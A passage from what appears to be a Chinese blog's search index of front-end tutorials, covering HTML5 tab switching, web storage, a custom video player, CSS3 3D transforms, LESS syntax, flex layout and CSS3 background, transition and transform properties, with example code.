    <content type="text"><![CDATA[之前学习了html,以及css，写后端也有一段时间了，现在把更多的精力放在了前端，那么，就从html5以及css3开始吧~~~，今天主要是实现了tab选项卡切换，之前也写过，现在用html5获取元素的新方法实现了一下，话不多说，代码如下 html代码分析代码可以知道，选项卡的class为active的时候，选项卡就被选中，当内容section的style属性为display:block时，内容就被选中123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; body &#123; margin: 0; padding: 0; background-color: #F7F7F7; &#125; .tabs &#123; width: 400px; margin: 30px auto; background-color: #FFF; border: 1px solid #C0DCC0; box-sizing: border-box; &#125; .tabs nav &#123; height: 40px; text-align: center; line-height: 40px; overflow: hidden; background-color: #C0DCC0; /* 伸缩盒模型 */ display: flex; &#125; nav a &#123; display: block; width: 100px; border-right: 1px solid #FFF; color: #000; text-decoration: none; &#125; nav a:last-child &#123; border-right: none; &#125; nav a.active &#123; background-color: #9BAF9B; &#125; .cont &#123; overflow: hidden; display: none; &#125; .cont ol &#123; line-height: 30px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="tabs"&gt; &lt;nav&gt; &lt;a href="javascript:;" data-cont="local" class="active"&gt;国内新闻&lt;/a&gt; &lt;a href="javascript:;" data-cont="global" &gt;国际新闻&lt;/a&gt; &lt;a href="javascript:;" data-cont="sports" &gt;体育新闻&lt;/a&gt; &lt;a href="javascript:;" data-cont="funny"&gt;娱乐新闻&lt;/a&gt; &lt;/nav&gt; &lt;section class="cont" id="local" style="display:block"&gt; &lt;ol&gt; &lt;li&gt;国内新闻&lt;/li&gt; &lt;li&gt;禽流感在感在广1处继续蔓延，温家宝指示&lt;/li&gt; &lt;li&gt;南方大旱，农作物减产绝收面积上亩&lt;/li&gt; &lt;li&gt;猪流感在广在全国暴发&lt;/li&gt; &lt;li&gt;禽流感在全国多处继续蔓延，温家宝指示&lt;/li&gt; &lt;li&gt;南方大旱，农作物减产绝收面积上亩&lt;/li&gt; &lt;li&gt;猪流感在广东群体性暴发&lt;/li&gt; &lt;/ol&gt; &lt;/section&gt; &lt;section class="cont" id="global" &gt; &lt;ol&gt; &lt;li&gt;国际新闻&lt;/li&gt; &lt;li&gt;禽流感次发生蔓延，温家宝指示&lt;/li&gt; &lt;li&gt;南方大旱，农作物减产绝收面积上亩&lt;/li&gt; &lt;li&gt;猪流感在广减产绝收发&lt;/li&gt; &lt;li&gt;禽流感在全国多作物减产绝收面积上亩&lt;/li&gt; &lt;li&gt;猪流感在广东群体性暴发&lt;/li&gt; &lt;/ol&gt; &lt;/section&gt; &lt;section class="cont" id="sports"&gt; &lt;ol&gt; &lt;li&gt;体育新闻&lt;/li&gt; &lt;li&gt;禽流感在全国多处农作物农延，温家宝指示&lt;/li&gt; &lt;li&gt;南方大旱，农作物减产绝收面积上亩&lt;/li&gt; &lt;li&gt;猪流感在广东群体性暴发&lt;/li&gt; &lt;li&gt;禽流感在全农作物继续蔓延，温家宝指示&lt;/li&gt; &lt;li&gt;南方大农作物减产绝收面积上亩&lt;/li&gt; &lt;li&gt;猪流感在广东群体性暴发&lt;/li&gt; &lt;/ol&gt; &lt;/section&gt; &lt;section class="cont" id="funny"&gt; &lt;ol&gt; &lt;li&gt;娱乐新闻&lt;/li&gt; &lt;li&gt;禽流感在全国物农延，温家宝指示&lt;/li&gt; &lt;li&gt;南方大旱，农作物减产绝收面积上亩&lt;/li&gt; &lt;li&gt;猪流感在广东群体性暴发&lt;/li&gt; &lt;li&gt;禽流感在全农作物继续蔓延，温家宝指示&lt;/li&gt; &lt;li&gt;猪流感在广东群体性暴发&lt;/li&gt; &lt;/ol&gt; &lt;/section&gt; &lt;/div&gt; js代码内容卡指内容，tab卡指点击的选项123456789101112131415161718192021222324252627282930&lt;script&gt; &lt;!--document.querySelectorAll获取所有的a标签--&gt; var aArr=document.querySelectorAll('a'); &lt;!--循环遍历--&gt; for(var i=0;i&lt;aArr.length;i++)&#123; &lt;!--给每个获取到的元素添加点击事件--&gt; aArr[i].onclick=function()&#123; &lt;!--获取当前激活的tab选项卡--&gt; var active=document.querySelector(".active"); &lt;!--移除之前的选项卡激活属性--&gt; active.classList.remove("active"); &lt;!--给当前点击的选项卡添加激活属性--&gt; this.classList.add("active"); &lt;!--获取当前的section标签id名字--&gt; var name=this.getAttribute("data-cont"); &lt;!--根据获取到的名字获取当前的内容卡--&gt; var section=document.getElementById(name); &lt;!--获取所有class为cont的元素，并循环遍历，取消所有内容卡的样式--&gt; var cont = document.getElementsByClassName("cont"); for(var i=0;i&lt;cont.length;i++)&#123; cont[i].style.display="none"; &#125; &lt;!--激活当前内容卡的样式--&gt; section.style.display="block"; &#125; &#125;&lt;/script&gt; 总结排它思想]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>css3</tag>
        <tag>html5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[html5之客户端存储]]></title>
    <url>%2F2018%2F11%2F28%2Fhtml5%E4%B9%8B%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AD%98%E5%82%A8%2Findex.html</url>
    <content type="text"><![CDATA[WebStorage介绍所谓的WebStorage指的是客户端存储,在这里指的是浏览器端存储,比如在网站上自动登陆这些功能,其实就是把一些少量的数据存储在浏览器等客户端中,这样可以减少没必要的请求到服务器,降低服务器的压力,给用户提供更好的体验. WebStorage的三种存储方式 cookie: 广泛使用 存储量4kb左右 会在浏览器和服务器间传递 一般由服务器端创建 可以设置存储时间(默认和session一样) cookie不容易操作 jquery.cookie.js插件 session(会话)Storage: H5新增 存储量5M左右 只会在浏览器存储数据(浏览器的内存中) 只会由浏览器端创建 存储时间是打开浏览器开始关闭浏览器消失 方法简洁明了 容易操作 local(本地)Storage: H5新增 存储量5M左右 只会在浏览器存储数据(存储在硬盘中) 只会由浏览器端创建 永久存储除非手动删除 方法简介明了 容易操作 localStorage 添加数据: window.localStorage.setItem(key,value); 获取数据: window.localStorage.getItem(key); 移除数据: window.localStorage.removeItem(key); 清除数据: window.localStorage.clear(); 获取key: window.localStorage.key(n); sessionStorage 添加数据: window.sessionStorage.setItem(key,value); 获取数据: window.sessionStorage.getItem(key); 移除数据: window.sessionStorage.removeItem(key); 清除数据: window.sessionStorage.clear(); 获取key: window.sessionStorage.key(n从0开始); 应用场景: 存储一些少量临时的数据(比较少用) 总结 localStorage和sessionStorage只能存储json 存储的数据不能太多 太多浏览器会卡]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>css3</tag>
        <tag>html5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[html5之自定义视频播放器]]></title>
    <url>%2F2018%2F11%2F28%2Fhtml5%E4%B9%8B%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%86%E9%A2%91%E6%92%AD%E6%94%BE%E5%99%A8%2Findex.html</url>
    <content type="text"><![CDATA[自定义样式的视频播放器 效果 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;自定义视频播放器&lt;/title&gt; &lt;!-- 所有的库一定都在当前页面的css的前面 --&gt; &lt;link rel="stylesheet" href="./css/font-awesome.min.css"&gt; &lt;!-- &lt;link rel="stylesheet" href="./css/font-awesome.css"&gt; --&gt; &lt;link rel="stylesheet" href="./css/main.css"&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="player"&gt; &lt;!-- 视频 --&gt; &lt;video src="./movie/movie02.mp4" width="100%" height="100%"&gt; &lt;!-- &lt;source src="./movie//movie02.mp4"&gt; --&gt; &lt;/video&gt; &lt;!-- 控制菜单 --&gt; &lt;div class="controls"&gt; &lt;!-- 播放按钮 --&gt; &lt;a href="javascript:;" class="play-btn fa fa-play-circle-o"&gt;&lt;/a&gt; &lt;!-- 进度条 --&gt; &lt;div class="progress"&gt; &lt;div class="progress-bar" style="width: 0%"&gt;&lt;/div&gt; &lt;/div&gt; &lt;!-- 播放时间 --&gt; &lt;div class="time"&gt; &lt;span class="current"&gt;00:00:00&lt;/span&gt;/ &lt;span class="total"&gt;00:00:00&lt;/span&gt; &lt;/div&gt; &lt;!-- 全屏按钮 --&gt; &lt;a href="javascript:;" class="fullscreen fa fa-expand"&gt;&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;script&gt; // 功能: // 1.视频的播放与暂停(图标变化) // 2.总时间的显示 // 3.当前时间的显示(进度) // 4.进度条的显示 // 5.跳跃播放 // 6.全屏 // 下面开始实现功能： // 1.视频的播放与暂停(图标变化) // 获取视频以及按钮 var video=document.querySelector("video"); var btn=document.querySelector(".play-btn"); btn.addEventListener("click",function()&#123; // 判断视频状态并改变按钮 if(video.paused)&#123; video.play(); // this.classList.toggle("fa-pause-circle-o"); this.classList.remove("fa-play-circle-o"); this.classList.add("fa-pause-circle-o"); &#125;else&#123; video.pause(); this.classList.remove("fa-pause-circle-o"); this.classList.add("fa-play-circle-o"); &#125; &#125;); // 2.总时间的显示 // 获取总时间的按钮 var total=document.querySelector(".total"); video.oncanplay=function()&#123; var h=Math.floor(video.duration/3600); var m=Math.floor(video.duration/60-(h*60)); var s=Math.floor(video.duration%60); h=h&lt;10?'0'+h:h; m=m&lt;10?'0'+m:m; s=s&lt;10?'0'+s:s; total.innerHTML=h+':'+m+':'+s; &#125; // 获取当前时间 var current=document.querySelector(".current"); // 获取进度条 var progressBar = document.querySelector(".progress-bar"); video.ontimeupdate=function()&#123; var h=Math.floor(video.currentTime/3600); var m=Math.floor(video.currentTime/60-(h*60)); var s=Math.floor(video.currentTime%60); h=h&lt;10?'0'+h:h; m=m&lt;10?'0'+m:m; s=s&lt;10?'0'+s:s; current.innerHTML=h+':'+m+':'+s; // 计算公式 进度条的长度 = 当前时间 / 总时间 * 100 + '%' progressBar.style.width = video.currentTime / video.duration * 100 + '%'; &#125; //跳跃播放 // 获取进度条 var progress=document.querySelector(".progress"); progress.addEventListener("click",function(event)&#123; var clickX=event.offsetX; var width=this.offsetWidth video.currentTime = clickX / width * video.duration; &#125;); // 全屏 // 获取按钮 var fullscreen = document.querySelector(".fullscreen"); fullscreen.onclick = function () &#123; // 请求全屏 video.webkitRequestFullScreen(); &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>css3</tag>
        <tag>html5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css3之3D转换]]></title>
    <url>%2F2018%2F11%2F25%2Fcss3%E4%B9%8B3D%E8%BD%AC%E6%8D%A2%2Findex.html</url>
    <content type="text"><![CDATA[css3的3D转换，很有意思的一个特效 用到的属性 transform: rotateX(-175deg);沿着x轴旋转 transform: rotateY(-70deg);沿着y轴旋转 transform: rotateZ(360deg);沿着z轴旋转 perspective: 1000px; 规定眼睛距离元素的距离 transform-style: preserve-3d;作用是让该元素中的所有转换元素显示成3D效果 background-position;设置背景图像的起始位置 实现的效果123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;link rel="stylesheet" type="text/css" href="./css/font-awesome.min.css"&gt; &lt;style&gt; html,body,ul&#123; margin: 0; padding: 0; &#125; .carousel&#123; position: relative; width: 560px; height: 300px; box-shadow: 0 0 1px #ccc; margin: 100px auto; &#125; ul&#123; list-style: none; width: 560px; height: 300px; &#125; li&#123; float: left; position: relative; width: 112px; height: 100%; transform-style: preserve-3d; transition: all 1s; &#125; span&#123; position: absolute; top: 0; left: 0; width: 100%; height: 100%; &#125; span:nth-child(1)&#123; transform: translateZ(150px); background-image: url(./images/1.jpg); &#125; span:nth-child(2)&#123; transform: rotateX(90deg) translateZ(150px); background-image: url(./images/2.jpg); &#125; span:nth-child(3)&#123; transform: rotateX(180deg) translateZ(150px); background-image: url(./images/3.jpg); &#125; span:nth-child(4)&#123; transform: rotateX(270deg) translateZ(150px); background-image: url(./images/4.jpg); &#125; li:nth-child(2) span&#123; background-position: -112px; &#125; li:nth-child(3) span&#123; background-position: -224px; &#125; li:nth-child(4) span&#123; background-position: -336px; &#125; li:nth-child(5) span&#123; background-position: -448px; &#125; li:nth-child(2)&#123; transition-delay: 0.25s; &#125; li:nth-child(3)&#123; transition-delay: 0.5s; &#125; li:nth-child(4)&#123; transition-delay: 0.75s; &#125; li:nth-child(5)&#123; transition-delay: 1s; &#125; .carousel a&#123; text-decoration: none; position: absolute; top: 50%; transform: translateY(-50%); color:#fff; font-size: 40px; &#125; a.prev&#123; left: 0; &#125; a.next&#123; right: 0; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="carousel"&gt; &lt;ul&gt; &lt;li&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;a href="javascript:;" class="prev fa fa-chevron-left"&gt;&lt;/a&gt; &lt;a href="javascript:;" class="next fa fa-chevron-right"&gt;&lt;/a&gt; &lt;/div&gt; &lt;script&gt; // 获取元素 两个按钮 li var aLi=document.querySelectorAll('li'); var prev=document.querySelector('.prev'); var next=document.querySelector('.next'); var lastLi=document.querySelector('li:last-child'); var flag=true; lastLi.addEventListener("transitionend",function()&#123; flag=true; &#125;) var num=0; // 给按钮添加点击事件 prev.onclick=function()&#123; if(flag==false)&#123;return;&#125; flag=false; num++; // 遍历所有li 并且给每个li添加样式 for(var i=0;i&lt;aLi.length;i++)&#123; aLi[i].style.transform="rotateX("+num*90+"deg)"; &#125; &#125; next.onclick=function()&#123; if(flag==false)&#123;return;&#125; flag=false; num--; // 遍历所有li 并且给每个li添加样式 for(var i=0;i&lt;aLi.length;i++)&#123; aLi[i].style.transform="rotateX("+num*90+"deg)"; &#125; &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>css3</tag>
        <tag>html5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css3之LESS简单入门]]></title>
    <url>%2F2018%2F11%2F25%2Fcss3%E4%B9%8BLESS%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8%2Findex.html</url>
    <content type="text"><![CDATA[CSS（层叠样式表）是一项出色的技术作为一门标记性语言，CSS 的先天性优点是语法相对简单，对使用者的要求较低，但它的致命弱点是需要书写大量看似没有逻辑的代码，不方便维护及扩展，不利于复用。造成这一现象的很大原因在于CSS是一门非程序式语言，没有变量、函数、SCOPE（作用域）等概念。Less的出现，为Web开发者带来了福音，它是一门CSS预处理语言，引入了变量、运算、函数、继承等功能，为CSS语言赋予了动态语言的特性。Less大大简化了CSS的编写，并且降低了CSS的维护成本。就像它的名称所说的那样，Less可以让我们用更少的代码做更多的事情。 语法1.注释123// 单行注释 不会编译到css中/* 多行注释 会编译到css中 */ 2.变量123456789101112131415161718192021// 语法: @变量名: 值@white: #fff;@bgColor: #ccc;@fontSize: 22px;// 多值变量@normalSize: 20px 30px 40px 50px;body &#123; background-color:@bgColor;&#125;main &#123; color: @bgColor; background-color: @white; font-size:@fontSize; padding:@normalSize;&#125;aside &#123; font-size:@fontSize; margin:@normalSize;&#125; 3.嵌套(尽量不要嵌套超过三层)123456789101112131415161718192021.container &#123; h1 &#123; font-size: 25px; color: #e45456; &#125; p &#123; font-size: 25px; color: #3c7949; &#125; .myclass &#123; h1 &#123; font-size: 25px; color: #e45456; &#125; p &#123; font-size: 25px; color: #3c7949; &#125; &#125;&#125; 父选择器符号(&amp;) 直接子选则器符号(&gt;)123456789101112131415161718192021.container &#123; &gt; h1 &#123; font-size: 25px; color: #e45456; &#125; &gt; p &#123; font-size: 25px; color: #3c7949; &#125; .myclass &#123; h1 &#123; font-size: 25px; color: #e45456; &#125; p &#123; font-size: 25px; color: #3c7949; &#125; &#125;&#125; 5.四则运算1234.box &#123; width: 20px*3 + 10; height: 30px/3-2; &#125; 6.函数123456789101112131415161718192021222324.effect(@normal:yellow, @hover:orange, @visited:darkorange, @active:green) &#123; color: @normal; &amp;:hover &#123; color: @hover; &#125; &amp;:visited &#123; color: @visited; &#125; &amp;:active &#123; color: @active; &#125;&#125;a &#123; // .effect(red,green,blue,black); .effect()&#125;.box &#123; .effect(pink,hotpink,lightpink,white);&#125; 7.导入12不同的功能 要把这些代码放到不同的文件中格式: @import "src" 8.继承12345678910111213141516aside &#123; font-size:24px; margin:20px 30px 40px 50px; border:1px solid #ccc;&#125;main &#123; color:#ccc; background-color:#fff; // font-size:24px; // padding:20px 30px 40px 50px; &amp;:extend(aside); border:none;&#125;]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>css3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css3之flex伸缩布局详解]]></title>
    <url>%2F2018%2F11%2F25%2Fcss3%E4%B9%8Bflex%E5%B8%83%E5%B1%80%E8%AF%A6%E8%A7%A3%2Findex.html</url>
    <content type="text"><![CDATA[下面介绍一种比用浮动定位更灵活的布局方式，是的，就是flex伸缩布局，flex伸缩布局也常用于移动端的布局，因为相对于possion,float，采用flex伸缩布局更灵活，也相对的对手机的资源消耗较少！ 伸缩布局会用到的属性 display: flex;让元素编程伸缩容器 flex-direction：row|row-reverse|column|column-reverse主轴方向，加reverse就是表示相反的方向 justify-content:flex-start|flex-end|center|space-around|space-between设置伸缩项目在主轴方向上的对其方式 flex-wrap: wrap(换行)|nowrap(不换行)控制伸缩项目是否换行 align-content：flex-start|flex-end|center|space-around|space-between处理换行后的结果 align-items：stretch|flex-start|flex-end|center处理不换行的结果(侧轴对齐) flex: 1;控制伸缩项目在伸缩容器中所占的剩余空间 align-self：flex-start|flex-end|center|space-around|space-between个别调整元素位置 order: 10;是用来调整顺序的 规则: 数字越小 元素越靠前 下面给出排列顺序的代码，其他属性请大家自行测试123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;title&gt;排列顺序&lt;/title&gt;&lt;style&gt; ul &#123; width: 500px; height: 500px; list-style: none; border: 1px solid #000; margin: 0 auto; padding: 0; &#125; li &#123; width: 50px; height: 50px; line-height: 50px; text-align: center; border: 1px solid #ccc; background-color: hotpink; float: left; &#125; ul &#123; display: flex; &#125; li:nth-child(1) &#123; order: 5; &#125; li:nth-child(2) &#123; order: 2; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;ul&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>css3</tag>
        <tag>html5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css3的一些新属性总结]]></title>
    <url>%2F2018%2F11%2F25%2Fcss3%E6%96%B0%E7%89%B9%E6%80%A71%2Findex.html</url>
    <content type="text"><![CDATA[最近在学习html5以及css3,在这里记录一下学到的一些新的属性，部分内容来自：http://www.w3school.com.cn box-sizing盒子尺寸box-sizing规定了盒子的计算方式，常用于消除hover时，盒子之间的影响，有三个属性：1box-sizing: content-box|border-box|inherit content-box：默认值，表示盒子的尺寸为加上边框以及内边距之后的大小border-box：规定了盒子的大小就是盒子的width以及heightinherit：表示盒子继承父元素box-sizing的值，示例代码：12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .box&#123; width: 200px; height: 200px; border: 20px solid red; padding: 20px; background-color: yellow; /*此时盒子尺寸为宽度加高度加内边距加边框，为280x280*/ /*box-sizing: content-box;*/ /*此时盒子尺寸为width以及height的值，为200x200*/ box-sizing: border-box; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; background-image多背景background-image可以设置多背景，常用于把一张图切成几张图，当成背景，用于网站图片加载可以减轻网站的访问压力，用法如下：123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;多背景&lt;/title&gt; &lt;style&gt; .box&#123; width: 623px; height: 417px; background-repeat: no-repeat; /*多张图片用逗号隔开*/ background-image: url(images/bg1.png), url(images/bg2.png), url(images/bg3.png), url(images/bg4.png), url(images/bg5.png); background-position: left top, right top, right bottom, left bottom, center center; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; background-size背景尺寸background-size可以实现修改背景的尺寸1background-size: length|percentage|cover|contain; length：表示可以用长度宽度设置背景的尺寸percentage：表示可以用百分比设置背景的尺寸以上两种一般是设置两个值，如果只设置一个值，则另一个值为自动cover：保证图片填充满元素，不管图片是否完整contain：保证图片完整显示，不保证是否填充满元素,示例代码：12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .box &#123; width: 500px; height: 500px; box-shadow: 0 0 1px #000; background-image: url("./images/1.jpg"); background-repeat: no-repeat; background-size: contain; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; background-origin背景原点background-origin规定了background-position定位的位置1background-origin: padding-box|border-box|content-box; border-box:从边框开始定位padding-box:从内边距开始定位content-box:从盒子内容开始定位，示例代码：123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .box &#123; width: 400px; height: 400px; border: 20px solid rgba(255,0,0,0.5); padding: 20px; background-repeat: no-repeat; background-image: url("./images/54.jpg"); background-origin: content-box; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; background-clip背景裁切background-clip控制背景显示多大的区域1background-clip: border-box|padding-box|content-box; border-box:控制图片在border以内的区域也显示padding-box:控制图片在padding以内的区域也显示content-box:控制图片在内容以内的区域显示，示例代码：12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .box &#123; width: 363px; height: 219px; border: 20px solid rgba(255, 0, 0, 0.5); padding: 20px; background-repeat: no-repeat; background-origin: border-box; background-image: url("./images/54.jpg"); background-clip: content-box; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; transition过渡过渡: 就是给改变添加过程1transition: property duration timing-function delay; transition-property:规定设置过渡效果的 CSS 属性的名称。transition-duration：规定完成过渡效果需要多少秒或毫秒。transition-timing-function：规定速度效果的速度曲线。transition-delay：定义过渡效果何时开始。代码如下;123456789101112131415161718192021222324252627282930313233343536&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;过渡&lt;/title&gt; &lt;style&gt; .box &#123; width: 20px; height: 80px; background-color: red; /*简单写法*/ /*transition: all 1s;*/ /*专业写法*/ transition-property:width; transition-duration: 1s; transition-delay: 1s; transition-timing-function: ease-in; /* linear 线性 匀速运动 */ /* ease 先快后慢 */ /* ease-in-out 先慢 后快 最后慢 */ /* ease-out 越来越慢 */ /* ease-in 越来越快 */ &#125; .box:hover &#123; width: 800px; background-color: green; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; transform 2D转换transform方法有很多，下面介绍几种最基础的：12345transform: translate(x,y);位置偏移，参数为偏移的距离transform: rotate(0deg);角度偏移，参数为旋转角度，正负对应顺逆时针transform: scale(0.5);缩放转换，参数大于1则放大，小于1则缩小transform-origin：left top;设置转换原点，参数可以是px或者百分比transform: skew(x, y);参数分别问沿着x轴以及y轴倾斜的角度 示例代码如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .box &#123; width: 200px; height: 200px; background-color: red; transform:rotate(100deg); &#125; .box2 &#123; width: 200px; height: 200px; background-color: red; transform: translate(200px, 300px); &#125; .box3 &#123; width: 200px; height: 200px; background-color: red; transition: all 2s; &#125; .box3:hover&#123; width: 200px; height: 200px; background-color: red; transform: scale(0.5); &#125; .box4&#123; position: absolute; top: 50%; left: 50%; margin-left: -155px; margin-top: -219px; width: 310px; height: 438px; &#125; img&#123; width: 200px; position: absolute; bottom: 0; left: 0; box-shadow: 0 0 1px #f7f7f7; transition: all 1s; transform-origin: left top; &#125; .box4:hover img:nth-child(1)&#123; transform: rotate(60deg); &#125; .box4:hover img:nth-child(2)&#123; transform: rotate(120deg); &#125; .box4:hover img:nth-child(3)&#123; transform: rotate(180deg); &#125; .box4:hover img:nth-child(4)&#123; transform: rotate(240deg); &#125; .box4:hover img:nth-child(5)&#123; transform: rotate(300deg); &#125; .box4:hover img:nth-child(6)&#123; transform: rotate(360deg); &#125; .box5&#123; width: 300px; height: 300px; background-color: yellow; margin-left: 1100px; transform: skew(152deg,60deg); &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt;&lt;/div&gt; &lt;div class="box2"&gt;&lt;/div&gt; &lt;div class="box3"&gt;&lt;/div&gt; &lt;div class="box4"&gt; &lt;img src="./images/pk1.png" alt=""&gt; &lt;img src="./images/pk1.png" alt=""&gt; &lt;img src="./images/pk1.png" alt=""&gt; &lt;img src="./images/pk1.png" alt=""&gt; &lt;img src="./images/pk1.png" alt=""&gt; &lt;img src="./images/pk1.png" alt=""&gt; &lt;/div&gt; &lt;div class="box5"&gt; 66666666666666666666666 &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 动画@keyframes:mymove 5s infinite 自定义动画名称，animation 将动画与 div 元素绑定，animation-iteration-count,控制动画的次数,infinite无数次，animation-delay 控制动画开始时间，animation-play-state 控制动画状态， paused(暂停) running(继续)animation-direction: normal|alternate 控制动画播放是否循环，animation-fill-mode:forwards;控制动画结束时的状态 backwards(回到动画的初始状态) forwards(停留在动画的结束状态)示例代码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta 